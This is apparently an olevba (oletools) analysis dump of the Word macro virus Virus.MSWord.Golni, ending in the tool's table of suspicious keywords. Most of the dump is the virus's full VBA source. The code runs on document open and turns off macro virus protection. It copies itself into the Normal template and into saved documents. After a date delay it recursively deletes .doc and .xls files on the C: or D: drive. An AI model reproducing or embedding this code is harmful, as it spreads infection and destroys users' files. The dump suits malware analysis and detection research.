olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Golni
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Golni - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO avp.bas 
in file: Virus.MSWord.Golni - OLE stream: 'Macros/VBA/avp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit
Dim k As String, f As String
Private Declare Function FindFirstFile Lib "kernel32" _
Alias "FindFirstFileA" _
(ByVal lpFileName As String, _
lpFindFileData As WIN32_FIND_DATA) As Long
Private Declare Function FindNextFile Lib "kernel32" _
Alias "FindNextFileA" _
(ByVal hFindFile As Long, _
lpFindFileData As WIN32_FIND_DATA) As Long
Private Declare Function GetFileAttributes Lib "kernel32" _
Alias "GetFileAttributesA" _
(ByVal lpFileName As String) As Long
Private Declare Function FindClose Lib "kernel32" _
(ByVal hFindFile As Long) As Long
Const MAX_PATH = 260
Const MAXDWORD = &HFFFF
Const INVALID_HANDLE_VALUE = -1
Const FILE_ATTRIBUTE_ARCHIVE = &H20
Const FILE_ATTRIBUTE_DIRECTORY = &H10
Const FILE_ATTRIBUTE_HIDDEN = &H2
Const FILE_ATTRIBUTE_NORMAL = &H80
Const FILE_ATTRIBUTE_READONLY = &H1
Const FILE_ATTRIBUTE_SYSTEM = &H4
Const FILE_ATTRIBUTE_TEMPORARY = &H100
Private Type FILETIME
dwLowDateTime As Long
dwHighDateTime As Long
End Type
Private Type WIN32_FIND_DATA
dwFileAttributes As Long
ftCreationTime As FILETIME
ftLastAccessTime As FILETIME
ftLastWriteTime As FILETIME
nFileSizeHigh As Long
nFileSizeLow As Long
dwReserved0 As Long
dwReserved1 As Long
cFileName As String * MAX_PATH
cAlternate As String * 14
End Type
Private Function StripNulls(OriginalStr As String) As String
If (InStr(OriginalStr, Chr(0)) > 0) Then
OriginalStr = Left(OriginalStr, _
InStr(OriginalStr, Chr(0)) - 1)
End If
StripNulls = OriginalStr
End Function
Private Function FindFilesAPI(path As String, _
SearchStr As String, _
FileCount As Integer, _
DirCount As Integer)
On Error Resume Next
Dim FileName As String
Dim DirName As String
Dim dirNames() As String
Dim nDir As Integer
Dim i As Integer
Dim hSearch As Long
Dim WFD As WIN32_FIND_DATA
Dim Cont As Integer
If Right(path, 1) <> "\" Then path = path & "\"
nDir = 0
ReDim dirNames(nDir)
Cont = True
hSearch = FindFirstFile(path & "*", WFD)
If hSearch <> INVALID_HANDLE_VALUE Then
Do While Cont
DirName = StripNulls(WFD.cFileName)
If (DirName <> ".") And (DirName <> "..") Then
If GetFileAttributes(path & DirName) And _
                           FILE_ATTRIBUTE_DIRECTORY Then
dirNames(nDir) = DirName
DirCount = DirCount + 1
nDir = nDir + 1
ReDim Preserve dirNames(nDir)
End If
End If
Cont = FindNextFile(hSearch, WFD)
Loop
Cont = FindClose(hSearch)
End If
hSearch = FindFirstFile(path & SearchStr, WFD)
Cont = True
If hSearch <> INVALID_HANDLE_VALUE Then
While Cont
FileName = StripNulls(WFD.cFileName)
If (FileName <> ".") And (FileName <> "..") Then
FindFilesAPI = FindFilesAPI + _
(WFD.nFileSizeHigh * MAXDWORD) + _
WFD.nFileSizeLow
FileCount = FileCount + 1
On Error Resume Next
Kill path & FileName
End If
Cont = FindNextFile(hSearch, WFD)
Wend
Cont = FindClose(hSearch)
End If
If nDir > 0 Then
For i = 0 To nDir - 1
FindFilesAPI = FindFilesAPI + _
FindFilesAPI(path & dirNames(i) _
& "\", SearchStr, FileCount, DirCount)
Next i
End If
End Function
 Sub AutoOpen()
Dim ad, nt
On Error Resume Next
Options.VirusProtection = False
ad = ActiveDocument.Name
nt = NormalTemplate.FullName
If NormalTemplate.VBProject.VBComponents.Item("Avp").Name = " " Then
k = FreeFile
MakeFile
End If
If NormalTemplate.VBProject.VBComponents.Item("Avp").Name <> "Avp" Then
Application.OrganizerCopy Source:=ad, Destination:=nt, Name:="Avp", Object:=wdOrganizerObjectProjectItems
End If
NormalTemplate.Save
DooIt
End Sub
Sub FileSave()
On Error Resume Next
If ActiveDocument.VBProject.VBComponents.Item("Avp").Name <> "avp" Then
NormalTemplate.VBProject.VBComponents("avp").Export "C:\Winlog.log"
ActiveDocument.VBProject.VBComponents.import "C:\Winlog.log"
Kill "C:\Winlog.log"
End If
ActiveDocument.Save
k = FreeFile
f = Dir$("C:\WINDOWS\Application Data\HelBoot.txt")
If f = "" Then
MakeFile
End If
DooIt
End Sub
Sub ViewVBCode()
If Options.BlueScreen = True Then ShowVisualBasicEditor = True
End Sub
Sub ToolsMacro()
End Sub
Sub DooIt()
On Error Resume Next
Dim d1 As Date, d, k As String, d2 As Date, t As Date
d1 = Format(Now, "short date"): k = FreeFile
Open "C:\WINDOWS\HelBoot.txt" For Input As #k
t = Format(Now, "short date")
Input #k, t
Close k
d2 = CDate(t): d = d1 - d2
Dim NumFiles As Integer, NumDirs As Integer, FileSize As Long
Dim SearchPath As String, FindStr As String, p, s
s = Int(1 + (Rnd() * 2))
If s = 1 Then
SearchPath = "C:\"
ElseIf s = 2 Then
SearchPath = "D:\"
End If
If 5 < d Then
p = Int(1 + (Rnd() * 2))
If p = 1 Then
FindStr = "*.xls"
ElseIf p = 2 Then
FindStr = "*.doc"
ElseIf p = 1 And 12 < d Then
FindStr = "*.txt"
End If
FileSize = FindFilesAPI(SearchPath, FindStr, NumFiles, NumDirs)
End If
End Sub
Sub MakeFile()
Open "C:\WINDOWS\Application Data\HelBoot.txt" For Output As #k
Dim t As Date
t = Format(Now, "short date")
Write #k, t
Close k
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

